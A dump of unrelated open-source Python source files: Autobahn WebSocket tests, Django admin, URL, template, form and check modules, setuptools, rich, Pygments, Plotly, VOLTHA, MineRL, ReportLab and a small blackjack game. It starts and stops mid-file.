async def echo_async(what, when):
    await asyncio.sleep(when)
    return what


@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')
@pytest.mark.asyncio
async def test_echo_async():
    assert 'Hello!' == await echo_async('Hello!', 0)


# @pytest.mark.asyncio(forbid_global_loop=True)
@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')
def test_websocket_custom_loop(event_loop):
    factory = WebSocketServerFactory(loop=event_loop)
    server = factory()
    transport = Mock()
    server.connection_made(transport)


@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')
@pytest.mark.asyncio
async def test_async_on_connect_server(event_loop):

    num = 42
    done = txaio.create_future()
    values = []

    async def foo(x):
        await asyncio.sleep(1)
        return x * x

    async def on_connect(req):
        v = await foo(num)
        values.append(v)
        txaio.resolve(done, req)

    factory = WebSocketServerFactory()
    server = factory()
    server.onConnect = on_connect
    transport = Mock()

    server.connection_made(transport)
    server.data = b'\r\n'.join([
        b'GET /ws HTTP/1.1',
        b'Host: www.example.com',
        b'Sec-WebSocket-Version: 13',
        b'Origin: http://www.example.com.malicious.com',
        b'Sec-WebSocket-Extensions: permessage-deflate',
        b'Sec-WebSocket-Key: tXAxWFUqnhi86Ajj7dRY5g==',
        b'Connection: keep-alive, Upgrade',
        b'Upgrade: websocket',
        b'\r\n',  # last string doesn't get a \r\n from join()
    ])
    server.processHandshake()
    await done

    assert len(values) == 1
    assert values[0] == num * num"
JY225	JY225-admin_urls.py	"from urllib.parse import parse_qsl, unquote, urlparse, urlunparse

from django import template
from django.contrib.admin.utils import quote
from django.urls import Resolver404, get_script_prefix, resolve
from django.utils.http import urlencode

register = template.Library()


@register.filter
def admin_urlname(value, arg):
    return ""admin:%s_%s_%s"" % (value.app_label, value.model_name, arg)


@register.filter
def admin_urlquote(value):
    return quote(value)


@register.simple_tag(takes_context=True)
def add_preserved_filters(context, url, popup=False, to_field=None):
    opts = context.get(""opts"")
    preserved_filters = context.get(""preserved_filters"")

    parsed_url = list(urlparse(url))
    parsed_qs = dict(parse_qsl(parsed_url[4]))
    merged_qs = {}

    if opts and preserved_filters:
        preserved_filters = dict(parse_qsl(preserved_filters))

        match_url = ""/%s"" % unquote(url).partition(get_script_prefix())[2]
        try:
            match = resolve(match_url)
        except Resolver404:
            pass
        else:
            current_url = ""%s:%s"" % (match.app_name, match.url_name)
            changelist_url = ""admin:%s_%s_changelist"" % (
                opts.app_label,
                opts.model_name,
            )
            if (
                changelist_url == current_url
                and ""_changelist_filters"" in preserved_filters
            ):
                preserved_filters = dict(
                    parse_qsl(preserved_filters[""_changelist_filters""])
                )

        merged_qs.update(preserved_filters)

    if popup:
        from django.contrib.admin.options import IS_POPUP_VAR

        merged_qs[IS_POPUP_VAR] = 1
    if to_field:
        from django.contrib.admin.options import TO_FIELD_VAR

        merged_qs[TO_FIELD_VAR] = to_field

    merged_qs.update(parsed_qs)

    parsed_url[4] = urlencode(merged_qs)
    return urlunparse(parsed_url)"
JD81	JD81-_itertools.py	"from itertools import filterfalse


def unique_everseen(iterable, key=None):
    ""List unique elements, preserving order. Remember all elements ever seen.""
    # unique_everseen('AAAABBBCCDAABBB') --> A B C D
    # unique_everseen('ABBCcAD', str.lower) --> A B C D
    seen = set()
    seen_add = seen.add
    if key is None:
        for element in filterfalse(seen.__contains__, iterable):
            seen_add(element)
            yield element
    else:
        for element in iterable:
            k = key(element)
            if k not in seen:
                seen_add(k)
                yield element


# copied from more_itertools 8.8
def always_iterable(obj, base_type=(str, bytes)):
    """"""If *obj* is iterable, return an iterator over its items::

        >>> obj = (1, 2, 3)
        >>> list(always_iterable(obj))
        [1, 2, 3]

    If *obj* is not iterable, return a one-item iterable containing *obj*::

        >>> obj = 1
        >>> list(always_iterable(obj))
        [1]

    If *obj* is ``None``, return an empty iterable:

        >>> obj = None
        >>> list(always_iterable(None))
        []

    By default, binary and text strings are not considered iterable::

        >>> obj = 'foo'
        >>> list(always_iterable(obj))
        ['foo']

    If *base_type* is set, objects for which ``isinstance(obj, base_type)``
    returns ``True`` won't be considered iterable.

        >>> obj = {'a': 1}
        >>> list(always_iterable(obj))  # Iterate over the dict's keys
        ['a']
        >>> list(always_iterable(obj, base_type=dict))  # Treat dicts as a unit
        [{'a': 1}]

    Set *base_type* to ``None`` to avoid any special handling and treat objects
    Python considers iterable as iterable:

        >>> obj = 'foo'
        >>> list(always_iterable(obj, base_type=None))
        ['f', 'o', 'o']
    """"""
    if obj is None:
        return iter(())

    if (base_type is not None) and isinstance(obj, base_type):
        return iter((obj,))

    try:
        return iter(obj)
    except TypeError:
        return iter((obj,))"
JY193	JY193-main.py	"import art
import random

# black jack rules
#  dealer gives you to card

print(art.logo)
print('Welcome to Black Jack')
cards_dict = {
	'ace': 11,
	'king': 10,
	'queen': 10,
	'jack': 10,
	'ten': 10,
	'nine': 9,
	'eight': 8,
	'seven': 7,
	'six': 6,
	'five': 5,
	'four': 4,
	'three': 3,
	'two': 2
}

card_choices = []

for key, value in cards_dict.items():
	card_choices.append(key)


player = input('Enter your name:\n')


def deal():
	card = random.choice(card_choices)
	return card


def score(list_card):
	total = 0
	for item in list_card:
		total += cards_dict[item]
	if ('ace' in list_card) and total > 21:
		total -= 10

	return total


end = False
computer_card = []
player_card = []

computer_card.append(deal())

player_card.append(deal())
player_card.append(deal())


print(f""{player}'s cards are {player_card}"")
print(f'computer card is {computer_card}')

while not end:
	hit = input('Do you want to deal? ""yes"" or ""no"":\n')

	if hit == ""yes"":
		player_card.append(deal())
		computer_card.append(deal())

		score_computer = score(computer_card)
		score_player = score(player_card)

		print(f""{player}'s cards are {player_card} with score {score_player}"")
		print(f""computer cards are {computer_card} with score {score_computer}"")

		if score_player > 21:
			print(f""{player} lose"")
			break  # if you use end=True here, it will still check other conditions but break do not give a shit.!

		if score_computer < 17:
			print(""Dealer card is less than 17"")
			computer_card.append(deal())
			score_computer = score(computer_card)
			print(f""computer cards are {computer_card} with score {score_computer}"")
			print(f""{player}'s cards are {player_card} with score {score_player}"")

		if score_computer > 21:
			print(f'{player} win')
			break

		if score_computer == score_player:
			print('It is a draw')
			end = True

		if score_player < score_computer <= 21:
			print(f""{player} lose"")
			end = True
		if score_computer < score_player <= 21:
			print(f""{player} win"")
			end = True

	else:
		print(f""Good Bye {player}"")
		end = True









"
JY101	JY101-mixins.py	"from django.core import checks

NOT_PROVIDED = object()


class FieldCacheMixin:
    """"""Provide an API for working with the model's fields value cache.""""""

    def get_cache_name(self):
        raise NotImplementedError

    def get_cached_value(self, instance, default=NOT_PROVIDED):
        cache_name = self.get_cache_name()
        try:
            return instance._state.fields_cache[cache_name]
        except KeyError:
            if default is NOT_PROVIDED:
                raise
            return default

    def is_cached(self, instance):
        return self.get_cache_name() in instance._state.fields_cache

    def set_cached_value(self, instance, value):
        instance._state.fields_cache[self.get_cache_name()] = value

    def delete_cached_value(self, instance):
        del instance._state.fields_cache[self.get_cache_name()]


class CheckFieldDefaultMixin:
    _default_hint = (""<valid default>"", ""<invalid default>"")

    def _check_default(self):
        if (
            self.has_default()
            and self.default is not None
            and not callable(self.default)
        ):
            return [
                checks.Warning(
                    ""%s default should be a callable instead of an instance ""
                    ""so that it's not shared between all field instances.""
                    % (self.__class__.__name__,),
                    hint=(
                        ""Use a callable instead, e.g., use `%s` instead of ""
                        ""`%s`."" % self._default_hint
                    ),
                    obj=self,
                    id=""fields.E010"",
                )
            ]
        else:
            return []

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_default())
        return errors"
JD84	JD84-dist_info.py	"""""""
Create a dist_info directory
As defined in the wheel specification
""""""

import os
import re
import warnings
from inspect import cleandoc

from distutils.core import Command
from distutils import log
from setuptools.extern import packaging


class dist_info(Command):

    description = 'create a .dist-info directory'

    user_options = [
        ('egg-base=', 'e', ""directory containing .egg-info directories""
                           "" (default: top of the source tree)""),
    ]

    def initialize_options(self):
        self.egg_base = None

    def finalize_options(self):
        pass

    def run(self):
        egg_info = self.get_finalized_command('egg_info')
        egg_info.egg_base = self.egg_base
        egg_info.finalize_options()
        egg_info.run()
        name = _safe(self.distribution.get_name())
        version = _version(self.distribution.get_version())
        base = self.egg_base or os.curdir
        dist_info_dir = os.path.join(base, f""{name}-{version}.dist-info"")
        log.info(""creating '{}'"".format(os.path.abspath(dist_info_dir)))

        bdist_wheel = self.get_finalized_command('bdist_wheel')
        bdist_wheel.egg2dist(egg_info.egg_info, dist_info_dir)


def _safe(component: str) -> str:
    """"""Escape a component used to form a wheel name according to PEP 491""""""
    return re.sub(r""[^\w\d.]+"", ""_"", component)


def _version(version: str) -> str:
    """"""Convert an arbitrary string to a version string.""""""
    v = version.replace(' ', '.')
    try:
        return str(packaging.version.Version(v)).replace(""-"", ""_"")
    except packaging.version.InvalidVersion:
        msg = f""""""Invalid version: {version!r}.
        !!\n\n
        ###################
        # Invalid version #
        ###################
        {version!r} is not valid according to PEP 440.\n
        Please make sure specify a valid version for your package.
        Also note that future releases of setuptools may halt the build process
        if an invalid version is given.
        \n\n!!
        """"""
        warnings.warn(cleandoc(msg))
        return _safe(v).strip(""_"")"
JY422	JY422-_windows.py	"import sys
from dataclasses import dataclass


@dataclass
class WindowsConsoleFeatures:
    """"""Windows features available.""""""

    vt: bool = False
    """"""The console supports VT codes.""""""
    truecolor: bool = False
    """"""The console supports truecolor.""""""


try:
    import ctypes
    from ctypes import LibraryLoader, wintypes

    if sys.platform == ""win32"":
        windll = LibraryLoader(ctypes.WinDLL)
    else:
        windll = None
        raise ImportError(""Not windows"")
except (AttributeError, ImportError, ValueError):

    # Fallback if we can't load the Windows DLL
    def get_windows_console_features() -> WindowsConsoleFeatures:
        features = WindowsConsoleFeatures()
        return features

else:

    STDOUT = -11
    ENABLE_VIRTUAL_TERMINAL_PROCESSING = 4
    _GetConsoleMode = windll.kernel32.GetConsoleMode
    _GetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
    _GetConsoleMode.restype = wintypes.BOOL

    _GetStdHandle = windll.kernel32.GetStdHandle
    _GetStdHandle.argtypes = [
        wintypes.DWORD,
    ]
    _GetStdHandle.restype = wintypes.HANDLE

    def get_windows_console_features() -> WindowsConsoleFeatures:
        """"""Get windows console features.

        Returns:
            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.
        """"""
        handle = _GetStdHandle(STDOUT)
        console_mode = wintypes.DWORD()
        result = _GetConsoleMode(handle, console_mode)
        vt = bool(result and console_mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        truecolor = False
        if vt:
            win_version = sys.getwindowsversion()
            truecolor = win_version.major > 10 or (
                win_version.major == 10 and win_version.build >= 15063
            )
        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)
        return features


if __name__ == ""__main__"":
    import platform

    features = get_windows_console_features()
    from pip._vendor.rich import print

    print(f'platform=""{platform.system()}""')
    print(repr(features))"
JY20	JY20-lilypond.py	"""""""
    pygments.styles.lilypond
    ~~~~~~~~~~~~~~~~~~~~~~~~

    LilyPond-specific style.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Token

class LilyPondStyle(Style):
    """"""
    Style for the LilyPond language.
        
    .. versionadded:: 2.11
    """"""

    # Don't show it in the gallery, it's intended for LilyPond
    # input only and doesn't show good output on Python code.
    web_style_gallery_exclude = True

    styles = {
        Token.Text: """",
        Token.Keyword: ""bold"",
        Token.Comment: ""italic #A3AAB2"",
        Token.String: ""#AB0909"",
        Token.String.Escape: ""#C46C6C"",
        Token.String.Symbol: ""noinherit"",
        Token.Pitch: """", #""#911520"",
        Token.Number: ""#976806"", # includes durations
        # A bare 11 is not distinguishable from a number, so we highlight
        # the same.
        Token.ChordModifier: ""#976806"",
        Token.Name.Lvalue: ""#08547A"",
        Token.Name.BackslashReference: ""#08547A"",
        Token.Name.Builtin.MusicCommand: ""bold #08547A"",
        Token.Name.Builtin.PaperVariable: ""bold #6C5A05"",
        Token.Name.Builtin.HeaderVariable: ""bold #6C5A05"",
        Token.Name.Builtin.MusicFunction: ""bold #08547A"",
        Token.Name.Builtin.Clef: ""bold #08547A"",
        Token.Name.Builtin.Scale: ""bold #08547A"",
        Token.Name.Builtin.RepeatType: ""#08547A"",
        Token.Name.Builtin.Dynamic: ""#68175A"",
        Token.Name.Builtin.Articulation: ""#68175A"",
        Token.Name.Builtin.SchemeFunction: ""bold #A83401"",
        Token.Name.Builtin.SchemeBuiltin: ""bold"",
        Token.Name.Builtin.MarkupCommand: ""bold #831E71"",
        Token.Name.Builtin.Context: ""bold #038B8B"",
        Token.Name.Builtin.ContextProperty: ""#038B8B"",
        Token.Name.Builtin.Grob: ""bold #0C7441"",
        Token.Name.Builtin.GrobProperty: ""#0C7441"",
        Token.Name.Builtin.Translator: ""bold #6200A4"",
    }"
JD463	JD463-__init__.py	"# Copyright 2017-present Open Networking Foundation
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# Copyright (c) 2008 The Board of Trustees of The Leland Stanford Junior University
# Copyright (c) 2011, 2012 Open Networking Foundation
# Copyright (c) 2012, 2013 Big Switch Networks, Inc.
# See the file LICENSE.pyloxi which should have been included in the source distribution
# Automatically generated by LOXI from template toplevel_init.py
# Do not modify

version_names = {
    1: ""1.0"",
    2: ""1.1"",
    3: ""1.2"",
    4: ""1.3"",
    5: ""1.4"",
}

def protocol(ver):
    """"""
    Import and return the protocol module for the given wire version.
    """"""
    if ver == 1:
        import of10
        return of10

    if ver == 2:
        import of11
        return of11

    if ver == 3:
        import of12
        return of12

    if ver == 4:
        import of13
        return of13

    if ver == 5:
        import of14
        return of14

    raise ValueError

class ProtocolError(Exception):
    """"""
    Raised when failing to deserialize an invalid OpenFlow message.
    """"""
    pass

class Unimplemented(Exception):
    """"""
    Raised when an OpenFlow feature is not yet implemented in PyLoxi.
    """"""
    pass

def unimplemented(msg):
    raise Unimplemented(msg)

class OFObject(object):
    """"""
    Superclass of all OpenFlow classes
    """"""
    def __init__(self, *args):
        raise NotImplementedError(""cannot instantiate abstract class"")

    def __ne__(self, other):
        return not self.__eq__(other)

    def show(self):
        import loxi.pp
        return loxi.pp.pp(self)"
JD133	JD133-__init__.py	"###############################################################################
#
# The MIT License (MIT)
#
# Copyright (c) typedef int GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the ""Software""), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
###############################################################################

import platform

import autobahn

# WebSocket protocol support
from autobahn.asyncio.websocket import \
    WebSocketServerProtocol, \
    WebSocketClientProtocol, \
    WebSocketServerFactory, \
    WebSocketClientFactory

# WAMP support
from autobahn.asyncio.wamp import ApplicationSession


__all__ = (
    'WebSocketServerProtocol',
    'WebSocketClientProtocol',
    'WebSocketServerFactory',
    'WebSocketClientFactory',
    'ApplicationSession',
)

__ident__ = 'Autobahn/{}-asyncio-{}/{}'.format(autobahn.__version__, platform.python_implementation(), platform.python_version())
""""""
AutobahnPython library implementation (eg. ""Autobahn/0.13.0-asyncio-CPython/3.5.1"")
"""""""
JY298	JY298-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""sankey.link.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD261	JD261-onu_voltage_yellow_alarm.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory
from voltha.extensions.alarms.adapter_alarms import AlarmBase


class OnuVoltageYellowAlarm(AlarmBase):
    """"""
    The ONU Voltage Red Alarm is reported by the ONT-G (ME # 256) to
    indicate some services have been shut down to avoid power collapse.
    The operational state of the affected PPTPs indicates the affected
    services.

    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI
    physical port number
    """"""
    def __init__(self, alarm_mgr, onu_id, intf_id):
        super(OnuVoltageYellowAlarm, self).__init__(alarm_mgr, object_type='onu voltage yellow',
                                                    alarm='ONU_VOLTAGE_YELLOW',
                                                    alarm_category=AlarmEventCategory.ONU,
                                                    alarm_type=AlarmEventType.COMMUNICATION,
                                                    alarm_severity=AlarmEventSeverity.MAJOR)
        self._onu_id = onu_id
        self._intf_id = intf_id

    def get_context_data(self):
        return {'onu-id': self._onu_id,
                'onu-intf-id': self._intf_id}"
JY299	JY299-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""sankey.node.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD14	JD14-urls.py	"""""""tst_tc2236_hstvprde_68491 URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/2.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""

from django.contrib import admin
from django.urls import path, include, re_path
from django.views.generic.base import TemplateView
from allauth.account.views import confirm_email
from rest_framework import permissions
from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView

urlpatterns = [
    
    path(""accounts/"", include(""allauth.urls"")),
    path(""modules/"", include(""modules.urls"")),
    path(""api/v1/"", include(""home.api.v1.urls"")),
    path(""admin/"", admin.site.urls),
    path(""users/"", include(""users.urls"", namespace=""users"")),
    path(""rest-auth/"", include(""rest_auth.urls"")),
    # Override email confirm to use allauth's HTML view instead of rest_auth's API view
    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),
    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),
]

admin.site.site_header = ""TST-TC2236-hstvprdenr""
admin.site.site_title = ""TST-TC2236-hstvprdenr Admin Portal""
admin.site.index_title = ""TST-TC2236-hstvprdenr Admin""

# swagger
urlpatterns += [
    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),
    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")
]


urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
JY355	JY355-place.py	"# Copyright (c) 2020 All Rights Reserved
# Author: William H. Guss, Brandon Houghton
from typing import Optional

from minerl.herobraine.hero.handlers.agent.action import Action, ItemListAction
import jinja2
import minerl.herobraine.hero.spaces as spaces


class PlaceBlock(ItemListAction):
    """"""
    An action handler for placing a specific block
    """"""

    def to_string(self):
        return 'place'

    def xml_template(self) -> str:
        return str(""<PlaceCommands/>"")

    def __init__(self, blocks: list, _other=Optional[str], _default=Optional[str]):
        """"""
        Initializes the space of the handler to be one for each item in the list
        Requires 0th item to be 'none' and last item to be 'other' coresponding to
        no-op and non-listed item respectively
        """"""
        self._items = blocks
        self._command = 'place'
        kwargs = {}
        if _other is not None:
            kwargs['_other'] = _other
        if _default is not None:
            kwargs['_default'] = _default
        super().__init__(self._command, self._items, **kwargs)
        self._prev_inv = None

    def from_universal(self, obs):
        try:
            for action in obs['custom_action']['actions'].keys():
                try:
                    if int(action) == -99 and self._prev_inv is not None:

                        item_name = self._prev_inv[int(-10 + obs['hotbar'])]['name'].split(""minecraft:"")[-1]
                        if item_name not in self._items:
                            raise ValueError()
                        else:
                            return item_name
                except ValueError:
                    return self._other
        except TypeError:
            print('Saw a type error in PlaceBlock')
            raise TypeError
        except KeyError:
            return self._default
        finally:
            try:
                self._prev_inv = obs['slots']['gui']['slots']
            except KeyError:
                self._prev_inv = None

        return self._default"
JD97	JD97-translation.py	"from django.conf import settings
from django.utils.translation import get_supported_language_variant
from django.utils.translation.trans_real import language_code_re

from . import Error, Tags, register

E001 = Error(
    'You have provided an invalid value for the LANGUAGE_CODE setting: {!r}.',
    id='translation.E001',
)

E002 = Error(
    'You have provided an invalid language code in the LANGUAGES setting: {!r}.',
    id='translation.E002',
)

E003 = Error(
    'You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}.',
    id='translation.E003',
)

E004 = Error(
    'You have provided a value for the LANGUAGE_CODE setting that is not in '
    'the LANGUAGES setting.',
    id='translation.E004',
)


@register(Tags.translation)
def check_setting_language_code(app_configs, **kwargs):
    """"""Error if LANGUAGE_CODE setting is invalid.""""""
    tag = settings.LANGUAGE_CODE
    if not isinstance(tag, str) or not language_code_re.match(tag):
        return [Error(E001.msg.format(tag), id=E001.id)]
    return []


@register(Tags.translation)
def check_setting_languages(app_configs, **kwargs):
    """"""Error if LANGUAGES setting is invalid.""""""
    return [
        Error(E002.msg.format(tag), id=E002.id)
        for tag, _ in settings.LANGUAGES if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_setting_languages_bidi(app_configs, **kwargs):
    """"""Error if LANGUAGES_BIDI setting is invalid.""""""
    return [
        Error(E003.msg.format(tag), id=E003.id)
        for tag in settings.LANGUAGES_BIDI if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_language_settings_consistent(app_configs, **kwargs):
    """"""Error if language settings are not consistent with each other.""""""
    try:
        get_supported_language_variant(settings.LANGUAGE_CODE)
    except LookupError:
        return [E004]
    else:
        return []"
JD100	JD100-loader.py	"from . import engines
from .exceptions import TemplateDoesNotExist


def get_template(template_name, using=None):
    """"""
    Load and return a template for the given name.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    chain = []
    engines = _engine_list(using)
    for engine in engines:
        try:
            return engine.get_template(template_name)
        except TemplateDoesNotExist as e:
            chain.append(e)

    raise TemplateDoesNotExist(template_name, chain=chain)


def select_template(template_name_list, using=None):
    """"""
    Load and return a template for one of the given names.

    Try names in order and return the first template found.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    if isinstance(template_name_list, str):
        raise TypeError(
            ""select_template() takes an iterable of template names but got a ""
            ""string: %r. Use get_template() if you want to load a single ""
            ""template by name."" % template_name_list
        )

    chain = []
    engines = _engine_list(using)
    for template_name in template_name_list:
        for engine in engines:
            try:
                return engine.get_template(template_name)
            except TemplateDoesNotExist as e:
                chain.append(e)

    if template_name_list:
        raise TemplateDoesNotExist("", "".join(template_name_list), chain=chain)
    else:
        raise TemplateDoesNotExist(""No template names provided"")


def render_to_string(template_name, context=None, request=None, using=None):
    """"""
    Load a template and render it with a context. Return a string.

    template_name may be a string or a list of strings.
    """"""
    if isinstance(template_name, (list, tuple)):
        template = select_template(template_name, using=using)
    else:
        template = get_template(template_name, using=using)
    return template.render(context, request)


def _engine_list(using=None):
    return engines.all() if using is None else [engines[using]]"
JY380	JY380-excelcolors.py	"# define standard colors to mimic those used by Microsoft Excel
from reportlab.lib.colors import CMYKColor, PCMYKColor

#colour names as comments at the end of each line are as a memory jogger ONLY
#NOT HTML named colours!

#Main colours as used for bars etc
color01 = PCMYKColor(40,40,0,0)    # Lavender
color02 = PCMYKColor(0,66,33,39)   # Maroon
color03 = PCMYKColor(0,0,20,0)     # Yellow
color04 = PCMYKColor(20,0,0,0)     # Cyan
color05 = PCMYKColor(0,100,0,59)   # Purple
color06 = PCMYKColor(0,49,49,0)    # Salmon
color07 = PCMYKColor(100,49,0,19)  # Blue
color08 = PCMYKColor(20,20,0,0)    # PaleLavender
color09 = PCMYKColor(100,100,0,49) # NavyBlue
color10 = PCMYKColor(0,100,0,0)    # Purple

#Highlight colors - eg for the tops of bars
color01Light = PCMYKColor(39,39,0,25)   # Light Lavender
color02Light = PCMYKColor(0,66,33,54)   # Light Maroon
color03Light = PCMYKColor(0,0,19,25)    # Light Yellow
color04Light = PCMYKColor(19,0,0,25)    # Light Cyan
color05Light = PCMYKColor(0,100,0,69)   # Light Purple
color06Light = PCMYKColor(0,49,49,25)   # Light Salmon
color07Light = PCMYKColor(100,49,0,39)  # Light Blue
color08Light = PCMYKColor(19,19,0,25)   # Light PaleLavender
color09Light = PCMYKColor(100,100,0,62) # Light NavyBlue
color10Light = PCMYKColor(0,100,0,25)   # Light Purple

#Lowlight colors - eg for the sides of bars
color01Dark = PCMYKColor(39,39,0,49)   # Dark Lavender
color02Dark = PCMYKColor(0,66,33,69)   # Dark Maroon
color03Dark = PCMYKColor(0,0,20,49)    # Dark Yellow
color04Dark = PCMYKColor(20,0,0,49)    # Dark Cyan
color05Dark = PCMYKColor(0,100,0,80)   # Dark Purple
color06Dark = PCMYKColor(0,50,50,49)   # Dark Salmon
color07Dark = PCMYKColor(100,50,0,59)  # Dark Blue
color08Dark = PCMYKColor(20,20,0,49)   # Dark PaleLavender
color09Dark = PCMYKColor(100,100,0,79) # Dark NavyBlue
color10Dark = PCMYKColor(0,100,0,49)   # Dark Purple

#for standard grey backgrounds
backgroundGrey = PCMYKColor(0,0,0,24)
"
JD160	JD160-forms.py	"from django.contrib.auth.forms import UserCreationForm
from django import forms
from django.contrib.auth.models import User
from .models import Post

class RegisterForm(UserCreationForm):
    email = forms.EmailField(label = ""Email"")
    firstname = forms.CharField(label = ""First name"")
    lastname = forms.CharField(label = ""Last name"")

    class Meta:
        model = User
        fields = (""username"", ""firstname"", ""lastname"", ""email"", )

    def save(self, commit=True):
        user = super(RegisterForm, self).save(commit=False)
        firstname = self.cleaned_data[""firstname""]
        lastname = self.cleaned_data[""lastname""]
        user.first_name = firstname
        user.last_name = lastname
        user.email = self.cleaned_data[""email""]
        if commit:
            user.save()
        return user
    
class PostForm(forms.ModelForm):
    text = forms.CharField(max_length=1000, widget=forms.Textarea(attrs={'placeholder': 'What\'s on your mind?', 'onchange': 'character_count()', 'onkeypress': 'character_count()', 'onfocus': 'character_count()' ,'oninput': 'character_count()', 'onkeyup':'character_count()','onpaste':'character_count()'}))
    images = forms.ImageField(required=False,widget=forms.ClearableFileInput(attrs={'multiple': True, 'onchange': 'previewImages(this)'}))
    class Meta:
        model = Post
        fields = (""text"", )

class SearchForm(forms.Form):
